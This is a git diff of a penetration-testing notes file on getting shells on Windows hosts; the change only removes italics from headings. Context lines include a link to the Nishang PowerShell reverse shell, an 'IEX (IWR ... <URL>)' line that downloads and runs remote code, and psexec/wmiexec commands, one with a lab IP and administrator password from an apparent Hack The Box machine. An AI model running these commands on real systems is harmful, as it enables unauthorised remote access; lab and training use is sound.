@@ -10,9 +10,9 @@ cssclasses:
 
 ###### PRIMARY CATEGORY → [[WINDOWS PENTESTING]]
 
-#### *HTTP ↔ TCP*
+#### HTTP ↔ TCP
 
-##### *Nishang PS Reverse Shell*
+##### Nishang PS Reverse Shell
 
 > ***[Nishang Reverse Shell Oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)***
 
@@ -75,9 +75,9 @@ IEX (IWR -UseBasicParsing -Uri '<URL>') # Or Invoke-Expression (Invoke-WebReques
 
 ---
 
-#### *SMB*
+#### SMB
 
-##### *PSExec*
+##### PSExec
 
 This tool from ***[impacket](https://github.com/fortra/impacket)*** can be used to stablish a bind shell if the user authenticated has administrative privileges in the *Workstation or Domain Computer*
 
@@ -136,9 +136,9 @@ psexec.py -dc-ip 10.129.135.22 active.htb/Administrator:Ticketmaster1968@active.
 
 ---
 
-#### *RPC*
+#### RPC
 
-##### *WMIExec*
+##### WMIExec
 
 ```bash
 wmiexec.py -dc-ip <TARGET> <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
